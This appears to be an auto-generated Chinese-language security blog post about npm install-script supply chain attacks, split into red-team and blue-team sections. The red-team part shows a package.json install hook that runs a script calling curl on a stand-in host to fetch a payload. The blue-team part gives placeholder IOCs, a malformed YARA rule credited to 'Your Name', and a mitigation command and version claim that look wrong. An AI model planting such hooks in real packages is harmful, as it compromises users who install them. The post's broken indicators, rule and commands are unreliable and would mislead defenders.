---
layout: post
title:  "GitHub to Disable npm Install Scripts by Default to Stop Supply Chain Attacks"
date:   2026-06-11 10:12:05 +0000
categories: [security]
severity: high
---

# 🔥 解析 npm 安全漏洞：預防軟體供應鏈攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.0)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `npm install`, `Lifecycle Hooks`, `Supply Chain Attack`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: npm 的 `install` 命令會執行每個依賴項的 lifecycle hooks，包括 `preinstall`, `install`, 和 `postinstall` 腳本。這些腳本可以包含惡意代碼，從而導致遠程代碼執行。
* **攻擊流程圖解**: 
  1. 攻擊者上傳一個包含惡意 lifecycle hook 的 npm 套件。
  2. 使用者執行 `npm install` 命令，下載並安裝依賴項。
  3. npm 執行每個依賴項的 lifecycle hooks，包括惡意腳本。
  4. 惡意腳本執行，導致遠程代碼執行。
* **受影響元件**: npm 版本 12 之前的所有版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要上傳一個包含惡意 lifecycle hook 的 npm 套件。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 惡意 lifecycle hook 範例
      {
        "name": "malicious-package",
        "version": "1.0.0",
        "scripts": {
          "install": "node malicious-script.js"
        }
      }
    
    ```
 

```

javascript
  // malicious-script.js 範例
  const childProcess = require('child_process');
  childProcess.exec('curl http://example.com/malicious-payload');

```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全措施，例如使用不同的 lifecycle hook 名稱或使用其他語言編寫惡意腳本。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/local/lib/node_modules/malicious-package |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule malicious_package {
        meta:
          description = "Detects malicious npm packages"
          author = "Your Name"
        strings:
          $script = "node malicious-script.js"
        condition:
          $script in (0..filesize - 1)
      }
    
    ```
* **緩解措施**: 
  1. 更新 npm 至版本 12 或以上。
  2. 執行 `npm config set allow-scripts false` 來禁用 lifecycle hooks。
  3. 使用 `npm audit` 來掃描依賴項中的安全漏洞。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Lifecycle Hook**: 惡意腳本可以註冊 lifecycle hook 來在特定事件觸發時執行，例如 `install` 或 `postinstall`。
* **Supply Chain Attack**: 攻擊者上傳惡意套件到 npm 伺服器，然後使用者下載並安裝該套件，從而導致安全漏洞。
* **npm install**: npm 的 `install` 命令會下載並安裝依賴項，包括執行 lifecycle hooks。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/github-to-disable-npm-install-scripts.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


